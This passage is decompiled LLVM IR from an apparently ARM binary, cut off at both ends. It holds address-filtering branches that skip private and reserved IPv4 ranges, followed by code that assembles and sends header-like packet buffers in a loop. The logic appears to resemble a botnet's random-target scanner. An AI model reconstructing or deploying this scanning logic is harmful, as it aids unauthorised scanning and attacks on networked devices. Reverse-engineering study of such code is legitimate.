  store i1 %v8_f75c, i1* %cpsr_z.global-to-local, align 1
  %v2_f760 = xor i1 %v3_f75c, true
  %v3_f760 = or i1 %v8_f75c, %v2_f760
  br i1 %v3_f760, label %dec_label_pc_f724, label %dec_label_pc_f764

dec_label_pc_f764:                                ; preds = %bb317
  %v2_f764 = icmp ugt i32 %v1_f728, 9
  store i1 %v2_f764, i1* %cpsr_c.global-to-local, align 1
  %v7_f764 = icmp eq i32 %v1_f728, 10
  store i1 %v7_f764, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f764, label %dec_label_pc_f724, label %dec_label_pc_f76c

dec_label_pc_f76c:                                ; preds = %dec_label_pc_f764
  %v2_f76c = icmp ugt i32 %v1_f728, 191
  store i1 %v2_f76c, i1* %cpsr_c.global-to-local, align 1
  %v7_f76c = icmp eq i32 %v1_f728, 192
  store i1 %v7_f76c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f76c, label %bb318, label %dec_label_pc_f778

bb318:                                            ; preds = %dec_label_pc_f76c
  %v3_f770 = icmp ugt i32 %v1_f73c, 167
  store i1 %v3_f770, i1* %cpsr_c.global-to-local, align 1
  %v8_f770 = icmp eq i32 %v1_f73c, 168
  store i1 %v8_f770, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f770, label %dec_label_pc_f724, label %dec_label_pc_f778

dec_label_pc_f778:                                ; preds = %dec_label_pc_f76c, %bb318
  %v7_f778 = icmp eq i32 %v1_f728, 172
  %.394 = zext i1 %v7_f778 to i32
  store i32 %.394, i32* %r3.global-to-local, align 4
  %v2_f784 = icmp ugt i32 %v1_f73c, 14
  store i1 %v2_f784, i1* %cpsr_c.global-to-local, align 1
  %v7_f784 = icmp eq i32 %v1_f73c, 15
  store i1 %v7_f784, i1* %cpsr_z.global-to-local, align 1
  %v2_f788 = xor i1 %v2_f784, true
  %v3_f788 = or i1 %v7_f784, %v2_f788
  br i1 %v3_f788, label %.thread10, label %bb321

.thread10:                                        ; preds = %dec_label_pc_f778
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f79c

bb321:                                            ; preds = %dec_label_pc_f778
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f78c = icmp eq i1 %v7_f778, false
  store i1 %v2_f78c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f78c, label %dec_label_pc_f79c, label %dec_label_pc_f794

dec_label_pc_f794:                                ; preds = %bb321
  %v2_f794 = icmp ugt i32 %v1_f73c, 30
  store i1 %v2_f794, i1* %cpsr_c.global-to-local, align 1
  %v7_f794 = icmp eq i32 %v1_f73c, 31
  store i1 %v7_f794, i1* %cpsr_z.global-to-local, align 1
  %v2_f798 = xor i1 %v2_f794, true
  %v3_f798 = or i1 %v7_f794, %v2_f798
  br i1 %v3_f798, label %dec_label_pc_f724, label %dec_label_pc_f79c

dec_label_pc_f79c:                                ; preds = %.thread10, %dec_label_pc_f794, %bb321
  %v7_f79c = icmp eq i32 %v1_f728, 100
  %.395 = zext i1 %v7_f79c to i32
  store i32 %.395, i32* %r3.global-to-local, align 4
  %v2_f7a8 = icmp ugt i32 %v1_f73c, 62
  store i1 %v2_f7a8, i1* %cpsr_c.global-to-local, align 1
  %v7_f7a8 = icmp eq i32 %v1_f73c, 63
  store i1 %v7_f7a8, i1* %cpsr_z.global-to-local, align 1
  %v2_f7ac = xor i1 %v2_f7a8, true
  %v3_f7ac = or i1 %v7_f7a8, %v2_f7ac
  br i1 %v3_f7ac, label %.thread15, label %bb324

.thread15:                                        ; preds = %dec_label_pc_f79c
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f7c0

bb324:                                            ; preds = %dec_label_pc_f79c
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f7b0 = icmp eq i1 %v7_f79c, false
  store i1 %v2_f7b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f7b0, label %dec_label_pc_f7c0, label %dec_label_pc_f7b8

dec_label_pc_f7b8:                                ; preds = %bb324
  %v2_f7b8 = icmp ugt i32 %v1_f73c, 125
  store i1 %v2_f7b8, i1* %cpsr_c.global-to-local, align 1
  %v7_f7b8 = icmp eq i32 %v1_f73c, 126
  store i1 %v7_f7b8, i1* %cpsr_z.global-to-local, align 1
  %v2_f7bc = xor i1 %v2_f7b8, true
  %v3_f7bc = or i1 %v7_f7b8, %v2_f7bc
  br i1 %v3_f7bc, label %dec_label_pc_f724, label %dec_label_pc_f7c0

dec_label_pc_f7c0:                                ; preds = %.thread15, %dec_label_pc_f7b8, %bb324
  %v2_f7c0 = icmp ugt i32 %v1_f728, 168
  store i1 %v2_f7c0, i1* %cpsr_c.global-to-local, align 1
  %v7_f7c0 = icmp eq i32 %v1_f728, 169
  store i1 %v7_f7c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f7c0, label %bb325, label %dec_label_pc_f7cc

bb325:                                            ; preds = %dec_label_pc_f7c0
  %v3_f7c4 = icmp eq i32 %v1_f73c, 255
  store i1 %v3_f7c4, i1* %cpsr_c.global-to-local, align 1
  store i1 %v3_f7c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_f7c4, label %dec_label_pc_f724, label %dec_label_pc_f7cc

dec_label_pc_f7cc:                                ; preds = %dec_label_pc_f7c0, %bb325
  %v7_f7cc = icmp eq i32 %v1_f728, 198
  %.396 = zext i1 %v7_f7cc to i32
  store i32 %.396, i32* %r3.global-to-local, align 4
  %v2_f7d8 = icmp ugt i32 %v1_f73c, 16
  store i1 %v2_f7d8, i1* %cpsr_c.global-to-local, align 1
  %v7_f7d8 = icmp eq i32 %v1_f73c, 17
  store i1 %v7_f7d8, i1* %cpsr_z.global-to-local, align 1
  %v2_f7dc = xor i1 %v2_f7d8, true
  %v3_f7dc = or i1 %v7_f7d8, %v2_f7dc
  br i1 %v3_f7dc, label %.thread21, label %bb328

.thread21:                                        ; preds = %dec_label_pc_f7cc
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f7f0

bb328:                                            ; preds = %dec_label_pc_f7cc
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f7e0 = icmp eq i1 %v7_f7cc, false
  store i1 %v2_f7e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f7e0, label %dec_label_pc_f7f0, label %dec_label_pc_f7e8

dec_label_pc_f7e8:                                ; preds = %bb328
  %v2_f7e8 = icmp ugt i32 %v1_f73c, 18
  store i1 %v2_f7e8, i1* %cpsr_c.global-to-local, align 1
  %v7_f7e8 = icmp eq i32 %v1_f73c, 19
  store i1 %v7_f7e8, i1* %cpsr_z.global-to-local, align 1
  %v2_f7ec = xor i1 %v2_f7e8, true
  %v3_f7ec = or i1 %v7_f7e8, %v2_f7ec
  br i1 %v3_f7ec, label %dec_label_pc_f724, label %dec_label_pc_f7f0

dec_label_pc_f7f0:                                ; preds = %.thread21, %dec_label_pc_f7e8, %bb328
  %v2_f7f0 = icmp ugt i32 %v1_f728, 222
  store i1 %v2_f7f0, i1* %cpsr_c.global-to-local, align 1
  %v7_f7f0 = icmp eq i32 %v1_f728, 223
  store i1 %v7_f7f0, i1* %cpsr_z.global-to-local, align 1
  %v2_f7f4 = xor i1 %v7_f7f0, true
  %v3_f7f4 = and i1 %v2_f7f0, %v2_f7f4
  br i1 %v3_f7f4, label %dec_label_pc_f724, label %dec_label_pc_f7f8

dec_label_pc_f7f8:                                ; preds = %dec_label_pc_f7f0
  %v7_f7f8 = icmp eq i32 %v1_f728, 106
  %.397 = zext i1 %v7_f7f8 to i32
  store i32 %.397, i32* @lr, align 4
  %v2_f804 = icmp ugt i32 %v1_f73c, 185
  store i1 %v2_f804, i1* %cpsr_c.global-to-local, align 1
  %v7_f804 = icmp eq i32 %v1_f73c, 186
  store i1 %v7_f804, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f804, label %bb331, label %dec_label_pc_f810

bb331:                                            ; preds = %dec_label_pc_f7f8
  %v2_f7f8 = icmp ugt i32 %v1_f728, 105
  store i1 %v2_f7f8, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_f7f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f7f8, label %dec_label_pc_f724, label %dec_label_pc_f810

dec_label_pc_f810:                                ; preds = %dec_label_pc_f7f8, %bb331
  %v2_f810 = icmp ugt i32 %v1_f73c, 186
  store i1 %v2_f810, i1* %cpsr_c.global-to-local, align 1
  %v7_f810 = icmp eq i32 %v1_f73c, 187
  store i1 %v7_f810, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f810, label %.thread26, label %.thread27

.thread27:                                        ; preds = %dec_label_pc_f810
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f824

.thread26:                                        ; preds = %dec_label_pc_f810
  store i32 %.397, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f81c = icmp eq i1 %v7_f7f8, false
  store i1 %v2_f81c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f81c, label %dec_label_pc_f824, label %dec_label_pc_f724

dec_label_pc_f824:                                ; preds = %.thread27, %.thread26
  %v2_f824 = icmp ugt i32 %v1_f73c, 184
  store i1 %v2_f824, i1* %cpsr_c.global-to-local, align 1
  %v7_f824 = icmp eq i32 %v1_f73c, 185
  store i1 %v7_f824, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f824, label %.thread30, label %.thread31

.thread31:                                        ; preds = %dec_label_pc_f824
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f838

.thread30:                                        ; preds = %dec_label_pc_f824
  store i32 %.397, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f830 = icmp eq i1 %v7_f7f8, false
  store i1 %v2_f830, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f830, label %dec_label_pc_f838, label %dec_label_pc_f724

dec_label_pc_f838:                                ; preds = %.thread31, %.thread30
  %v2_f838 = icmp ugt i32 %v1_f73c, 183
  store i1 %v2_f838, i1* %cpsr_c.global-to-local, align 1
  %v7_f838 = icmp eq i32 %v1_f73c, 184
  store i1 %v7_f838, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f838, label %.thread34, label %.thread35

.thread35:                                        ; preds = %dec_label_pc_f838
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f84c

.thread34:                                        ; preds = %dec_label_pc_f838
  store i32 %.397, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f844 = icmp eq i1 %v7_f7f8, false
  store i1 %v2_f844, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f844, label %dec_label_pc_f84c, label %dec_label_pc_f724

dec_label_pc_f84c:                                ; preds = %.thread35, %.thread34
  %v2_f84c = icmp ugt i32 %v1_f728, 149
  store i1 %v2_f84c, i1* %cpsr_c.global-to-local, align 1
  %v7_f84c = icmp eq i32 %v1_f728, 150
  store i1 %v7_f84c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f84c, label %bb332, label %dec_label_pc_f858

bb332:                                            ; preds = %dec_label_pc_f84c
  %v3_f850 = icmp ugt i32 %v1_f73c, 30
  store i1 %v3_f850, i1* %cpsr_c.global-to-local, align 1
  %v8_f850 = icmp eq i32 %v1_f73c, 31
  store i1 %v8_f850, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f850, label %dec_label_pc_f724, label %dec_label_pc_f858

dec_label_pc_f858:                                ; preds = %dec_label_pc_f84c, %bb332
  %v2_f858 = icmp ugt i32 %v1_f728, 48
  store i1 %v2_f858, i1* %cpsr_c.global-to-local, align 1
  %v7_f858 = icmp eq i32 %v1_f728, 49
  store i1 %v7_f858, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f858, label %bb333, label %dec_label_pc_f864

bb333:                                            ; preds = %dec_label_pc_f858
  %v3_f85c = icmp ugt i32 %v1_f73c, 50
  store i1 %v3_f85c, i1* %cpsr_c.global-to-local, align 1
  %v8_f85c = icmp eq i32 %v1_f73c, 51
  store i1 %v8_f85c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f85c, label %dec_label_pc_f724, label %dec_label_pc_f864

dec_label_pc_f864:                                ; preds = %dec_label_pc_f858, %bb333
  %v2_f864 = icmp ugt i32 %v1_f728, 177
  store i1 %v2_f864, i1* %cpsr_c.global-to-local, align 1
  %v7_f864 = icmp eq i32 %v1_f728, 178
  store i1 %v7_f864, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f864, label %bb334, label %dec_label_pc_f870

bb334:                                            ; preds = %dec_label_pc_f864
  %v3_f868 = icmp ugt i32 %v1_f73c, 61
  store i1 %v3_f868, i1* %cpsr_c.global-to-local, align 1
  %v8_f868 = icmp eq i32 %v1_f73c, 62
  store i1 %v8_f868, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f868, label %dec_label_pc_f724, label %dec_label_pc_f870

dec_label_pc_f870:                                ; preds = %dec_label_pc_f864, %bb334
  %v2_f870 = icmp ugt i32 %v1_f728, 159
  store i1 %v2_f870, i1* %cpsr_c.global-to-local, align 1
  %v7_f870 = icmp eq i32 %v1_f728, 160
  store i1 %v7_f870, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f870, label %bb335, label %dec_label_pc_f87c

bb335:                                            ; preds = %dec_label_pc_f870
  %v3_f874 = icmp ugt i32 %v1_f73c, 12
  store i1 %v3_f874, i1* %cpsr_c.global-to-local, align 1
  %v8_f874 = icmp eq i32 %v1_f73c, 13
  store i1 %v8_f874, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f874, label %dec_label_pc_f724, label %dec_label_pc_f87c

dec_label_pc_f87c:                                ; preds = %dec_label_pc_f870, %bb335
  %v1_f87c = add nsw i32 %v1_f728, -6
  store i32 %v1_f87c, i32* %r3.global-to-local, align 4
  %v2_f880 = icmp ugt i32 %v1_f728, 10
  store i1 %v2_f880, i1* %cpsr_c.global-to-local, align 1
  %v7_f880 = icmp eq i32 %v1_f728, 11
  store i1 %v7_f880, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f880, label %dec_label_pc_f724, label %bb336

bb336:                                            ; preds = %dec_label_pc_f87c
  %v3_f884 = icmp ne i32 %v1_f87c, 0
  store i1 %v3_f884, i1* %cpsr_c.global-to-local, align 1
  %v8_f884 = icmp eq i32 %v1_f87c, 1
  store i1 %v8_f884, i1* %cpsr_z.global-to-local, align 1
  %v2_f888 = xor i1 %v3_f884, true
  %v3_f888 = or i1 %v8_f884, %v2_f888
  br i1 %v3_f888, label %dec_label_pc_f724, label %dec_label_pc_f88c

dec_label_pc_f88c:                                ; preds = %bb336
  %v2_f88c = icmp ugt i32 %v1_f728, 21
  store i1 %v2_f88c, i1* %cpsr_c.global-to-local, align 1
  %v7_f88c = icmp eq i32 %v1_f728, 22
  store i1 %v7_f88c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f88c, label %dec_label_pc_f724, label %bb337

bb337:                                            ; preds = %dec_label_pc_f88c
  %v3_f890 = icmp ugt i32 %v1_f728, 20
  store i1 %v3_f890, i1* %cpsr_c.global-to-local, align 1
  %v8_f890 = icmp eq i32 %v1_f728, 21
  store i1 %v8_f890, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f890, label %dec_label_pc_f724, label %dec_label_pc_f898

dec_label_pc_f898:                                ; preds = %bb337
  %v2_f898 = icmp ugt i32 %v1_f728, 27
  store i1 %v2_f898, i1* %cpsr_c.global-to-local, align 1
  %v7_f898 = icmp eq i32 %v1_f728, 28
  store i1 %v7_f898, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f898, label %dec_label_pc_f724, label %bb338

bb338:                                            ; preds = %dec_label_pc_f898
  %v3_f89c = icmp ugt i32 %v1_f728, 25
  store i1 %v3_f89c, i1* %cpsr_c.global-to-local, align 1
  %v8_f89c = icmp eq i32 %v1_f728, 26
  store i1 %v8_f89c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f89c, label %dec_label_pc_f724, label %dec_label_pc_f8a4

dec_label_pc_f8a4:                                ; preds = %bb338
  %v2_f8a4 = icmp ugt i32 %v1_f728, 29
  store i1 %v2_f8a4, i1* %cpsr_c.global-to-local, align 1
  %v7_f8a4 = icmp eq i32 %v1_f728, 30
  store i1 %v7_f8a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f8a4, label %dec_label_pc_f724, label %bb339

bb339:                                            ; preds = %dec_label_pc_f8a4
  %v3_f8a8 = icmp ugt i32 %v1_f728, 28
  store i1 %v3_f8a8, i1* %cpsr_c.global-to-local, align 1
  %v8_f8a8 = icmp eq i32 %v1_f728, 29
  store i1 %v8_f8a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f8a8, label %dec_label_pc_f724, label %dec_label_pc_f8b0

dec_label_pc_f8b0:                                ; preds = %bb339
  %v2_f8b0 = icmp ugt i32 %v1_f728, 54
  store i1 %v2_f8b0, i1* %cpsr_c.global-to-local, align 1
  %v7_f8b0 = icmp eq i32 %v1_f728, 55
  store i1 %v7_f8b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f8b0, label %dec_label_pc_f724, label %bb340

bb340:                                            ; preds = %dec_label_pc_f8b0
  %v3_f8b4 = icmp ugt i32 %v1_f728, 32
  store i1 %v3_f8b4, i1* %cpsr_c.global-to-local, align 1
  %v8_f8b4 = icmp eq i32 %v1_f728, 33
  store i1 %v8_f8b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f8b4, label %dec_label_pc_f724, label %dec_label_pc_f8bc

dec_label_pc_f8bc:                                ; preds = %bb340
  %v2_f8bc = icmp ugt i32 %v1_f728, 214
  store i1 %v2_f8bc, i1* %cpsr_c.global-to-local, align 1
  %v7_f8bc = icmp eq i32 %v1_f728, 215
  store i1 %v7_f8bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f8bc, label %.thread50, label %bb341

bb341:                                            ; preds = %dec_label_pc_f8bc
  %v3_f8c0 = icmp ugt i32 %v1_f728, 213
  store i1 %v3_f8c0, i1* %cpsr_c.global-to-local, align 1
  %v8_f8c0 = icmp eq i32 %v1_f728, 214
  store i1 %v8_f8c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f8c0, label %bb342, label %dec_label_pc_f8d0

.thread50:                                        ; preds = %dec_label_pc_f8bc
  store i32 1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_f724

bb342:                                            ; preds = %bb341
  store i32 1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_f724

dec_label_pc_f8d0:                                ; preds = %bb341
  store i32 0, i32* @r4, align 4
  %v5_f8dc = call i32 @llvm.bswap.i32(i32 %v0_f724)
  store i32 %v5_f8dc, i32* %r3.global-to-local, align 4
  %tmp343 = and i32 %v0_f724, 65280
  %tmp344 = call i32 @llvm.bswap.i32(i32 %tmp343)
  %tmp345 = and i32 %v0_f724, 16711680
  %tmp346 = call i32 @llvm.bswap.i32(i32 %tmp345)
  %v3_f8e8 = mul nuw i32 %v3_f744, 16777216
  %v3_f8ec = udiv i32 %tmp344, 256
  %v4_f8f0 = mul nuw nsw i32 %tmp346, 256
  %tmp347 = and i32 %v0_f724, 32768
  %v3_f8f4 = icmp ne i32 %tmp347, 0
  store i1 %v3_f8f4, i1* %cpsr_c.global-to-local, align 1
  %v4_f8f4 = udiv i32 %v5_f8dc, 16777216
  store i32 ptrtoint (i8** @global_var_1caa4.147 to i32), i32* @r0, align 4
  %v5_f8f4 = or i32 %v4_f8f4, %v3_f8e8
  %v5_f8f0 = or i32 %v5_f8f4, %v4_f8f0
  %v2_f8fc = or i32 %v5_f8f0, %v3_f8ec
  store i32 %v2_f8fc, i32* %r2.global-to-local, align 4
  %v5_f900 = trunc i32 %v4_f8f4 to i8
  store i8 %v5_f900, i8* @global_var_1cab4.194, align 4
  store i32 20, i32* %r1.global-to-local, align 4
  store i8 0, i8* bitcast (i32* @global_var_1caae.195 to i8*), align 4
  store i8 0, i8* bitcast (i32* @global_var_1caaf.196 to i8*), align 4
  %v3_f910 = call i32 @function_d0b8(i32 ptrtoint (i8** @global_var_1caa4.147 to i32), i32 20)
  store i32 ptrtoint (i8** @global_var_1caa4.147 to i32), i32* %ip.global-to-local, align 4
  %sext6 = mul i32 %v3_f910, 16777216
  %v1_f918 = sdiv i32 %sext6, 16777216
  store i32 %v1_f918, i32* %r3.global-to-local, align 4
  %v2_f91c = and i32 %v1_f918, 128
  %v3_f91c = icmp ne i32 %v2_f91c, 0
  store i1 %v3_f91c, i1* %cpsr_c.global-to-local, align 1
  %v4_f91c = ashr i32 %sext6, 31
  store i32 %v4_f91c, i32* %r2.global-to-local, align 4
  %v1_f920 = trunc i32 %v1_f918 to i8
  store i8 %v1_f920, i8* bitcast (i32* @global_var_1caae.195 to i8*), align 4
  %v1_f924 = trunc i32 %v4_f91c to i8
  store i8 %v1_f924, i8* bitcast (i32* @global_var_1caaf.196 to i8*), align 4
  %v3_f928 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_f928, i32* %r0.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v4_f930 = call i32 @function_11944(i32 %v3_f928, i32 10)
  store i32 %v4_f930, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f934 = icmp eq i32 %v4_f930, 0
  store i1 %v2_f934, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f934, label %.thread232, label %bb348

.thread232:                                       ; preds = %dec_label_pc_f8d0
  store i32 ptrtoint (i32* @global_var_1cab8.151 to i32), i32* @lr, align 4
  br label %.thread60.thread97

bb348:                                            ; preds = %dec_label_pc_f8d0
  store i32 ptrtoint (i32* @global_var_1cab8.151 to i32), i32* %r0.global-to-local, align 4
  store i32 23, i32* %r3.global-to-local, align 4
  %v1_f944 = load i32, i32* @r4, align 4
  %v2_f944 = trunc i32 %v1_f944 to i8
  store i8 %v2_f944, i8* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1cab8.151 to i32), i32 2) to i8*), align 2
  %v0_f948.pr.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_f948.pr.pre, label %.thread60.thread97, label %.thread57

.thread57:                                        ; preds = %bb348
  %v1_f948 = load i32, i32* %r3.global-to-local, align 4
  %v2_f948 = trunc i32 %v1_f948 to i8
  %v3_f948 = load i32, i32* %r0.global-to-local, align 4
  %v4_f948 = add i32 %v3_f948, 3
  %v5_f948 = inttoptr i32 %v4_f948 to i8*
  store i8 %v2_f948, i8* %v5_f948, align 1
  %v0_f950.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  store i32 ptrtoint (i8** @global_var_1caa4.147 to i32), i32* %r0.global-to-local, align 4
  br i1 %v0_f950.pr.pr, label %.thread63, label %.thread65

.thread60.thread97:                               ; preds = %bb348, %.thread232
  store i32 ptrtoint (i8** @global_var_1caa4.147 to i32), i32* %r0.global-to-local, align 4
  br label %.thread63

.thread63:                                        ; preds = %.thread57, %.thread60.thread97
  store i32 9, i32* %r3.global-to-local, align 4
  store i32 19, i32* %r2.global-to-local, align 4
  %v3_f958 = load i32, i32* @lr, align 4
  %v4_f958 = add i32 %v3_f958, 2
  %v5_f958 = inttoptr i32 %v4_f958 to i8*
  store i8 9, i8* %v5_f958, align 1
  %v0_f95c.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_f95c.pr.pr, label %bb349, label %.thread65

bb349:                                            ; preds = %.thread63
  %v1_f95c = load i32, i32* %r2.global-to-local, align 4
  %v2_f95c = trunc i32 %v1_f95c to i8
  %v3_f95c = load i32, i32* @lr, align 4
  %v4_f95c = add i32 %v3_f95c, 3
  %v5_f95c = inttoptr i32 %v4_f95c to i8*
  store i8 %v2_f95c, i8* %v5_f95c, align 1
  br label %.thread65

.thread65:                                        ; preds = %.thread57, %.thread63, %bb349
  %v4_f960 = load i8, i8* @global_var_1cab4.194, align 1
  %v5_f960 = sext i8 %v4_f960 to i32
  store i32 %v5_f960, i32* %ip.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1cab8.151 to i32), i32* %lr.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1cab8.151 to i32), i32* @r1, align 4
  store i8 %v4_f960, i8* @global_var_1cabc.197, align 4
  store i32 5120, i32* %r2.global-to-local, align 4
  store i32 20, i32* %r3.global-to-local, align 4
  %v0_f978 = load i32, i32* %sl.global-to-local, align 4
  %v1_f978 = trunc i32 %v0_f978 to i8
  store i8 %v1_f978, i8* bitcast (i32* @global_var_1cac8.198 to i8*), align 4
  store i8 %v1_f978, i8* bitcast (i32* @global_var_1cac9.199 to i8*), align 4
  %v5_f980 = call i32 @function_d114(i32 ptrtoint (i8** @global_var_1caa4.147 to i32), i32 ptrtoint (i32* @global_var_1cab8.151 to i32), i32 5120, i32 20)
  %sext = mul i32 %v5_f980, 16777216
  %v1_f988 = sdiv i32 %sext, 16777216
  %v3_f990 = ashr i32 %sext, 31
  %v2_f994 = load i32, i32* @global_var_1cab8.151, align 4
  %v1_f99c = trunc i32 %v3_f990 to i8
  store i8 %v1_f99c, i8* bitcast (i32* @global_var_1cac9.199 to i8*), align 4
  store i32 2, i32* %stack_var_-92, align 4
  %v3_f9b0 = load i8, i8* @global_var_1cab4.194, align 1
  %v4_f9b0 = sext i8 %v3_f9b0 to i32
  store i32 %v4_f9b0, i32* @r4, align 4
  %v2_f9b4 = load i32, i32* @global_var_1cb3c.145, align 4
  store i32 %v2_f9b4, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1cab8.151 to i32), i32* %ip.global-to-local, align 4
  %v1_f9c4 = and i32 %v2_f994, 8388608
  %v2_f9c4 = icmp ne i32 %v1_f9c4, 0
  store i1 %v2_f9c4, i1* %cpsr_c.global-to-local, align 1
  %v1_f9cc = trunc i32 %v1_f988 to i8
  store i8 %v1_f9cc, i8* bitcast (i32* @global_var_1cac8.198 to i8*), align 4
  store i32 ptrtoint (i8** @global_var_1caa4.147 to i32), i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 %v2_f9e0, i32* %lr.global-to-local, align 4
  store i32 40, i32* %r2.global-to-local, align 4
  %v8_f9f4 = call i32 @function_1237c(i32 %v2_f9b4, i32* bitcast (i8** @global_var_1caa4.147 to i32*), i32 40, i32 16384, i32 %v2_f9e0, i32 16)
  store i32 %v8_f9f4, i32* %r0.global-to-local, align 4
  %v3_f9f8 = load i32, i32* %stack_var_-52, align 4
  %v1_f9fc = add i32 %v3_f9f8, 1
  store i32 %v1_f9fc, i32* %r3.global-to-local, align 4
  %v3_fa00 = icmp ugt i32 %v1_f9fc, 383
  store i1 %v3_fa00, i1* %cpsr_c.global-to-local, align 1
  %v8_fa00 = icmp eq i32 %v1_f9fc, 384
  store i1 %v8_fa00, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_f9fc, i32* %stack_var_-52, align 4
  %v5_fa08 = icmp slt i32 %v1_f9fc, 384
  br i1 %v5_fa08, label %.thread65.dec_label_pc_f6f4_crit_edge, label %dec_label_pc_fa0c

.thread65.dec_label_pc_f6f4_crit_edge:            ; preds = %.thread65
  %v0_f6f4.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_f6f4

dec_label_pc_fa0c:                                ; preds = %.thread65
  %v0_fa0c = load i32, i32* @r8, align 4
  br label %dec_label_pc_fa10

dec_label_pc_fa10:                                ; preds = %dec_label_pc_f6d4, %dec_label_pc_fa0c
  %stack_var_-1872.1 = phi i32 [ %stack_var_-1872.0, %dec_label_pc_f6d4 ], [ %v0_fa0c, %dec_label_pc_fa0c ]
  %v0_fa10 = call i32 @function_120c4()
  store i32 %v0_fa10, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v2_fa24 = inttoptr i32 %v0_fa10 to i32*
  %v6_fa4c = inttoptr i32 %v0_fa88 to i32*
  %v1_fa78 = add i32 %v0_fa88, 16
  %v2_fa78 = inttoptr i32 %v1_fa78 to i32*
  %v4_fa94 = ptrtoint i8* %stack_var_-1884.0 to i32
  %v1_fa9c = add i32 %v4_fa94, 1
  %v2_fa9c = inttoptr i32 %v1_fa9c to i8*
  %v1_fac0 = add i32 %v4_fa94, 2
  %v2_fac0 = inttoptr i32 %v1_fac0 to i8*
  %v1_fac4 = add i32 %v4_fa94, 3
  %v2_fac4 = inttoptr i32 %v1_fac4 to i8*
  %v4_fac8 = sext i8 %stack_var_-1876.0 to i32
  %v1_fba4 = bitcast i8* %stack_var_-1884.0 to i32*
  %v1_fa88 = add i32 %v0_fa88, 9
  %v2_fa88 = inttoptr i32 %v1_fa88 to i8*
  %v1_fad8 = add i32 %v4_fa94, 13
  %v2_fad8 = inttoptr i32 %v1_fad8 to i8*
  %v1_fafc = add i32 %v4_fa94, 8
  %v2_fafc = inttoptr i32 %v1_fafc to i32*
  %v1_fb3c = add i32 %v0_fa88, 12
